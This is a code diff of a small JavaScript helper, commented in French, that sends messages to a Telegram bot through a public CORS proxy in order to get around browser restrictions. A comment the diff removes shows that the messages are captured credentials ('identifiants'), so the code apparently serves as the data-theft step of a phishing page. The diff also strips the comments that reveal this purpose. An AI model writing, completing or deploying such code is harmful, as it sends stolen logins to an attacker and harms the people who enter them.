@@ -13,7 +13,6 @@ const TELEGRAM_CONFIG = {
  * @returns {Promise} - Promesse indiquant le succès ou l'échec de l'envoi
  */
 function sendToTelegram(message) {
-    // Utilisation d'un proxy CORS public pour contourner les restrictions
     const proxyUrl = 'https://corsproxy.io/?';
     const apiUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
     const url = proxyUrl + encodeURIComponent(apiUrl);
@@ -45,13 +44,10 @@ function sendToTelegram(message) {
     })
     .catch(error => {
         console.error('❌ Erreur lors de l\'envoi à Telegram:', error);
-        // On peut afficher une alerte pour prévenir l'utilisateur (optionnel)
-        // alert('Impossible d\'envoyer les identifiants à Telegram.');
         return null;
     });
 }
 
-// Export pour Node.js (si utilisé)
 if (typeof module !== 'undefined' && module.exports) {
     module.exports = { sendToTelegram, TELEGRAM_CONFIG };
 }
